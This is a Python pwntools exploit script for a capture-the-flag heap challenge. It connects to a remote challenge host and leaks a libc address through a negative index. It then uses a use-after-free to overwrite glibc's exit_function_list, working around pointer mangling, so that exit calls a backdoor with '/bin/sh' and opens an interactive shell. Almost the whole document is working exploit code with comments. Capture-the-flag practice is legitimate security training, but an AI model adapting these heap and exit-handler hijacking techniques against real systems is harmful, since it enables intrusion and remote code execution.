from pwn import *

fn = "./chall"
elf = ELF(fn, checksec=False)
libc = ELF("./libc.so.6", checksec=False)  # extracted from docker image
p = remote("win.the.seetf.sg", 2001)

context.binary = elf

import time


def sla(x, y) -> None:
    time.sleep(0.02)  # added stability for stdin
    p.sendlineafter(x, y)


def sl(x) -> None:
    time.sleep(0.02)  # added stability for stdin
    p.sendline(x)


def create(size, content):
    assert size >= 0x10
    assert len(content) <= (size - 0x10)
    sl(b"C")
    sla(b"What size?", str(size).encode("ascii"))
    sla(b"What content?", content)


def output(idx, size):
    assert size >= 0x10
    sl(b"O")
    sla(b"Which text?", str(idx).encode("ascii"))
    p.recvuntil(b"\n")
    res = p.recvn(size + 0x8 * 3)
    return res


def update(idx, content, size):
    assert size >= 0x10
    assert len(content) <= (size - 0x10)
    sl(b"U")
    sla(b"Which text?", str(idx).encode("ascii"))
    sl(content)


def delete(idx):
    sl(b"D")
    sla(b"Which text?", str(idx).encode("ascii"))


NUM_HEADERFOOTER_BYTES = 24

# 1. Libc leak
create(0x500, b"AAA")
create(0x500, b"BBB")
delete(0)
res = output(-1, 0x500)
libc_leak = u64(res[:6].ljust(8, b"\0"))
log.info("libc leak: " + hex(libc_leak))

libc_base = libc_leak - 0x7F0AED3E0CE0 + 0x007F0AED1C7000
log.info("libc base: " + hex(libc_base))
libc.address = libc_base
rop = ROP([libc])

# 2. Trigger exit calloc
for idx in range(32 - 2):
    create(0x50, b"ABCD")  # pad the exit_function_list
    delete(0)

# Now, we have filled our initial exit_function_list with 32 exit handlers
# 31 were registered by us (30 calls to delete here, 1 above) and the very 1st was registered by the binary (_dl_fini)
# So, the next exit handler to be registered will first allocate a new exit_function_list, since each exit_function_list can store a maximum of 32 exit_function-s.

# Prepare UAF chunk
sizeofstruct = 0x410  # in __new_exitfn: calloc (1, sizeof (struct exit_function_list));
create(sizeofstruct - NUM_HEADERFOOTER_BYTES, b"ABCD")
delete(
    0
)  # This frees up our chunk to be used by malloc, afterwhich registering our exit handler triggers calloc and yields this chunk.

# 3. Leak exit_function_list
res = output(
    -1, 0x410 - NUM_HEADERFOOTER_BYTES
)  # contains a exit_function_list struct with only exit function, cleanup.

func_leak = u64(res[24:32])  # the mangled pointer to cleanup is at this offset
log.info("Leak: " + hex(func_leak))
# Mangled pointer, see: https://sourceware.org/glibc/wiki/PointerEncryption
# Since the binary has PIE enabled and we do not know the base ELF address, we cannot easily reverse the mangled pointer to retrieve the key.
# Instead, we make use of the fact that the backdoor and cleanup functions are located close together in memory, i.e. only the least significant byte differs.
# Via some arithmetic, we can determine the correct mangled pointer for backup.
bit = res[26]  # 3rd byte
log.info("Bit:" + hex(bit))
correct_bit = bit ^ ((elf.sym["backdoor"] % 0x100) ^ (elf.sym["cleanup"] % 0x100)) * 2
log.info("Correct bit: " + hex(correct_bit))

# 4. UAF into exit_funcs
binsh = next(libc.search(b"/bin/sh\x00"))
log.info("binsh: " + hex(binsh))
mangled_address = func_leak + (correct_bit - bit) * 0x100**2
log.info("Mangled win: " + hex(mangled_address))
type_cxa = 4
onexit = p64(type_cxa) + p64(mangled_address) + p64(binsh)
update(
    -1, onexit, 0x410
)  # keep in mind we can only write after the first 0x10 bytes, which strips the next and idx

sl(b"E")  # exit, calling the backdoor function with binsh

p.interactive()
